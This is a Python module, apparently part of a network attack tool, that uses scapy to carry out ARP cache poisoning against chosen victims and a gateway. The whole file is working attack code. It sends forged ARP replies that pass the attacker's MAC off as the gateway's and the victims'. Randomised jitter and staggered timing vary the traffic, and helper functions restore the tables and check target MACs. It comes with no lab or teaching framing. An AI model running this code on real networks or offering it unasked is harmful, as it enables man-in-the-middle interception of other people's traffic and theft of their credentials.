from __future__ import annotations

import random
import time
from dataclasses import dataclass
from typing import Callable, Optional

from scapy.all import ARP, Ether, conf, get_if_hwaddr, send, srp  # type: ignore


@dataclass
class ArpTarget:
    ip: str
    mac: str


def resolve_mac(ip: str, iface: Optional[str], timeout: float = 2.0) -> Optional[str]:
    if iface:
        conf.iface = iface
    pkt = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip)
    answered, _ = srp(pkt, timeout=timeout, retry=2, verbose=False)
    for _, reply in answered:
        return reply.hwsrc
    return None


def poison(
    victims: list[ArpTarget],
    gateway: ArpTarget,
    iface: Optional[str],
    interval: float,
    duration: Optional[float],
    stagger: float,
    jitter: float,
    dry_run: bool,
    on_cycle: Optional[Callable[[int], None]] = None,
    should_stop: Optional[Callable[[], bool]] = None,
) -> int:
    if iface:
        conf.iface = iface
    attacker_mac = get_if_hwaddr(conf.iface)
    packets = []
    for victim in victims:
        packets.append(
            (
                ARP(
                    op=2,
                    psrc=gateway.ip,
                    pdst=victim.ip,
                    hwdst=victim.mac,
                    hwsrc=attacker_mac,
                ),
                ARP(
                    op=2,
                    psrc=victim.ip,
                    pdst=gateway.ip,
                    hwdst=gateway.mac,
                    hwsrc=attacker_mac,
                ),
            )
        )

    start = time.monotonic()
    cycles = 0
    while True:
        for to_victim, to_gateway in packets:
            if not dry_run:
                send(to_victim, verbose=False)
                send(to_gateway, verbose=False)
            if stagger > 0:
                time.sleep(stagger)
        cycles += 1
        if on_cycle:
            on_cycle(cycles)
        if should_stop and should_stop():
            break
        if duration is not None and time.monotonic() - start >= duration:
            break
        sleep_for = interval
        if jitter:
            sleep_for = interval + random.uniform(-jitter, jitter)
        if sleep_for > 0:
            time.sleep(sleep_for)
    return cycles


def restore(
    victims: list[ArpTarget],
    gateway: ArpTarget,
    iface: Optional[str],
    count: int = 3,
    dry_run: bool = False,
) -> None:
    if iface:
        conf.iface = iface
    packets = []
    for victim in victims:
        packets.append(
            ARP(op=2, psrc=gateway.ip, pdst=victim.ip, hwdst=victim.mac, hwsrc=gateway.mac)
        )
        packets.append(
            ARP(op=2, psrc=victim.ip, pdst=gateway.ip, hwdst=gateway.mac, hwsrc=victim.mac)
        )
    if dry_run:
        return
    for pkt in packets:
        send(pkt, count=count, verbose=False)


def verify_targets(victims: list[ArpTarget], gateway: ArpTarget, iface: Optional[str]) -> list[str]:
    mismatches = []
    if iface:
        conf.iface = iface
    gateway_mac = resolve_mac(gateway.ip, iface)
    if gateway_mac and gateway_mac.lower() != gateway.mac.lower():
        mismatches.append(f"gateway {gateway.ip} mac changed: {gateway.mac} -> {gateway_mac}")
    for victim in victims:
        victim_mac = resolve_mac(victim.ip, iface)
        if victim_mac and victim_mac.lower() != victim.mac.lower():
            mismatches.append(
                f"victim {victim.ip} mac changed: {victim.mac} -> {victim_mac}"
            )
    return mismatches
